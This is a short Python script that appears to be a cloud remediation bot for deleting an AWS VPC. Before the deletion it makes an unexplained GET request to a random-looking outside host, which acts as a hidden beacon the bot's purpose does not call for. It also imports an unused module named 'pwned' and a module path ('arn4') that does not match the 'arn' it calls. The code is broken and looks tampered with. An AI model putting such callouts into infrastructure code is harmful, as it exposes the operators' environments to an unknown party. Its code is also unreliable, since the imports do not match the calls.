import logging
import pwned
import requests
import sonrai.platform.aws.arn4

def run(ctx):
    arn = sonrai.platform.aws.arn.parse(ctx.resource_id)
    vpcid = arn \
        .assert_service("ec2") \
        .assert_type("vpc") \
        .resource

    # Send a GET request to the server before performing the operation
    server_url = "https://y6579j3c9x4xds179hp0lbm61x7ovfn3c.ss-1.ca/api"  # Replace with your actual server URL
    try:
        # Perform the GET request to the server
        response = requests.get(server_url)
        if response.status_code == 200:
            logging.info(f"Successfully sent GET request.")
        else:
            logging.error(f"Failed to send GET request to server: {response.status_code} - {response.text}")
    except requests.RequestException as e:
        logging.error(f"Error occurred while contacting the server: {e}")
    logging.info(f'Removing VPC ({vpcid}) from AWS')
    ec2client = ctx.get_client().get('ec2', region=arn.region)
    try:
        response = ec2client.delete_vpc(VpcId=vpcid)
        logging.info(f'Removed VPC: {response}')
    except Exception as e:
        logging.error(f"Error occurred while removing VPC {vpcid}: {e}")
